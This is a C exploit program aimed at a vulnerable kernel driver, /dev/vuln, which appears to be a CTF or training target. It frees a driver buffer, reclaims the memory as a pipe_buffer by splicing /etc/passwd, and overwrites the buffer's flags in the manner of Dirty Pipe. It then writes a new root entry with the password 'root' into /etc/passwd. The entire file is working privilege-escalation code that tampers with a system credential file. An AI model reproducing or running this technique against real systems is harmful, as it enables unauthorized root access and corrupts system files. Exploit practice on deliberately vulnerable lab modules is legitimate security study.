#define _GNU_SOURCE
#define _FILE_OFFSET_BITS 64
#include <fcntl.h>      // for open, splice, O_RDONLY, O_RDWR
#include <stdint.h>     // for uintptr_t
#include <stdio.h>      // for puts, printf, NULL, size_t, perror
#include <stdlib.h>     // for exit, EXIT_FAILURE, EXIT_SUCCESS
#include <sys/ioctl.h>  // for ioctl
#include <unistd.h>     // for pipe, write

#define CMD_ALLOC	0xf000
#define CMD_READ	0xf001
#define CMD_WRITE	0xf002
#define CMD_FREE	0xf003

typedef struct {
	size_t size;
	char *data;
} request_t;

#define PIPE_BUF_FLAG_CAN_MERGE 0x10

struct pipe_buffer {
	struct page *page;
	unsigned int offset, len;
	const struct pipe_buf_operations *ops;
	unsigned int flags;
	unsigned long private;
};

static int dev = -1;

static void fatal(const char *err)
{
	perror(err);
	exit(EXIT_FAILURE);
}

static void dev_alloc(void)
{
	request_t req;
	req.size = 0;
	req.data = NULL;

	ioctl(dev, CMD_ALLOC, &req);
}

static void dev_read(uintptr_t data, size_t len)
{
	request_t req;
	req.size = len;
	req.data = (char *)data;

	ioctl(dev, CMD_READ, &req);
}

static void dev_write(uintptr_t data, size_t len)
{
	request_t req;
	req.size = len;
	req.data = (char *)data;

	ioctl(dev, CMD_WRITE, &req);
}

static void dev_free(void)
{
	request_t req;
	req.size = 0;
	req.data = NULL;

	ioctl(dev, CMD_FREE, &req);
}

int main(void)
{
	const char payload[] =
		"root:$1$root$9gr5KxwuEdiI80GtIzd.U0:0:0:root:/root:/bin/sh";
	struct pipe_buffer buf;
	int pipefd[2];
	int passwd;
	int ret;

	dev = open("/dev/vuln", O_RDWR);
	if (dev == -1)
		fatal("[-] open");

	puts("[+] dev alloc");
	dev_alloc();

	puts("[+] dev free");
	dev_free();

	puts("[+] alloc struct pipe_buffer");
	if (pipe(pipefd) == -1)
		fatal("[-] pipe");

	passwd = open("/etc/passwd", O_RDONLY);
	if (passwd == -1)
		fatal("[-] open");

	puts("[+] splice /etc/passwd");
	ret = splice(passwd, NULL, pipefd[1], NULL, 1, 0);
	if (ret == -1)
		fatal("[-] splice");

	puts("[+] leaking struct pipe_buffer");
	dev_read((uintptr_t)&buf, sizeof(buf));
	printf("[+] page: %p\n", buf.page);
	printf("[+] offset: %u\n", buf.offset);
	printf("[+] len: %u\n", buf.len);
	printf("[+] ops: %p\n", buf.ops);
	printf("[+] flags: %#x\n", buf.flags);
	printf("[+] private: %lu\n", buf.private);

	puts("[+] overwriting struct pipe_buffer");
	buf.len = 0;
	buf.flags = PIPE_BUF_FLAG_CAN_MERGE;
	dev_write((uintptr_t)&buf, sizeof(buf));

	puts("[+] overwriting /etc/passwd");
	ret = write(pipefd[1], payload, sizeof(payload));
	if (ret == -1)
		fatal("[-] write");

	puts("[+] I ❤️ 小嘉");
	puts("[+] get r00t!");
	puts("[+] user: root pass: root");
	return EXIT_SUCCESS;
}
